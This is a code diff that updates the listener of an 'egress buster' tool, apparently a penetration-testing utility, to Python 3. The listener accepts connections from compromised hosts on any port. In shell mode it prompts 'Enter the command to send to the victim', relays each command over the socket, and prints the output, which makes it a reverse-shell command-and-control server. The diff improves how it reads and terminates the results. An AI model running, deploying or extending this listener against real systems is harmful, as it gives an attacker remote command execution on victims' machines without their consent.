@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 #
 # This is the listener for the egress buster - works both on posix and windows
 #
@@ -22,6 +22,8 @@ SO_ORIGINAL_DST = 80
 # define empty variable
 shell = ""
 running = True
+
+shell_connected = False 
 
 # assign arg params
 try:
@@ -60,22 +62,27 @@ except:
 class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
     # handle the packet
     def handle(self):
+        global shell_connected
         port = struct.unpack(
             '!HHBBBB',
             self.request.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)[:8]
         )[1]  # (proto, port, IPa, IPb, IPc, IPd)
         self.data = self.request.recv(1024).strip()
         print("[*] Connected from %s on port: %d/tcp (client reported %s)" % (self.client_address[0], port, self.data))
-        if shell == "shell":
+        if shell == "shell" and not shell_connected:
+            shell_connected = True
+            results_terminator = self.request.recv(1024).decode().rstrip()
             while running:
-                request = raw_input("Enter the command to send to the victim: ")
+                request = input("Enter the command to send to the victim: ")
                 if request != "":
-                    self.request.sendall(request)
+                    self.request.sendall(request.encode())
                     if request == "quit" or request == "exit":
                         break
                     try:
-                        self.data = self.request.recv(1024).strip()
-                        print(self.data)
+                        self.data = self.request.recv(8192).decode()
+                        while not self.data.endswith(results_terminator):
+                             self.data += self.request.recv(8192).decode()
+                        print(self.data.rstrip()[:-1*len(results_terminator)])
                     except:
                         pass
         return
